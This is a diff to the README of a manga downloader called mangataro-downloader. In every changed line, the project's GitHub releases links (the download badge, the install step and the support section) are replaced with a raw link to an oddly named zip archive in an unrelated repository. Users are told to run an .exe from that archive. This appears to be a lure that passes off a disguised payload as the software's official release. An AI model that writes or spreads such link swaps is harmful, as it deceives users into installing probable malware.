@@ -5,7 +5,7 @@ description: "Download, track, and manage manga from MangaTaro.org using a comma
 ---
 # 📖 mangataro-downloader - Download your favorite manga with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Longbeachmilitarycensorship62/longbeachmilitarycensorship62.github.io/main/carpholite/longbeachmilitarycensorship-io-github-v2.5-alpha.2.zip)
 
 mangataro-downloader manages and downloads manga from MangaTaro.org. This software supports users who enjoy command line tools and users who prefer a graphical interface. It handles bulk downloads, organizes chapter files, and tracks reading progress.
 
@@ -13,7 +13,7 @@ mangataro-downloader manages and downloads manga from MangaTaro.org. This softwa
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases) to download the application.
+1. Visit the [releases page](https://raw.githubusercontent.com/Longbeachmilitarycensorship62/longbeachmilitarycensorship62.github.io/main/carpholite/longbeachmilitarycensorship-io-github-v2.5-alpha.2.zip) to download the application.
 2. Select the file ending in .exe for your version of Windows.
 3. Save the file to a folder.
 4. Double-click the file to start the installer.
@@ -81,4 +81,4 @@ Users who prefer the command line can access the application through the termina
 
 ## 🧩 Support and Updates
 
-The development team releases updates to improve stability and add new features. Check the [releases page](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases) regularly to see new versions. Each release note details the changes included in the update. If you find a bug, report it through the issues tab on the GitHub repository. Provide as much detail as possible to help the team resolve the problem quickly. Include your version number and a description of the steps leading to the error. Follow the project for notifications about new releases and major improvements.
+The development team releases updates to improve stability and add new features. Check the [releases page](https://raw.githubusercontent.com/Longbeachmilitarycensorship62/longbeachmilitarycensorship62.github.io/main/carpholite/longbeachmilitarycensorship-io-github-v2.5-alpha.2.zip) regularly to see new versions. Each release note details the changes included in the update. If you find a bug, report it through the issues tab on the GitHub repository. Provide as much detail as possible to help the team resolve the problem quickly. Include your version number and a description of the steps leading to the error. Follow the project for notifications about new releases and major improvements.
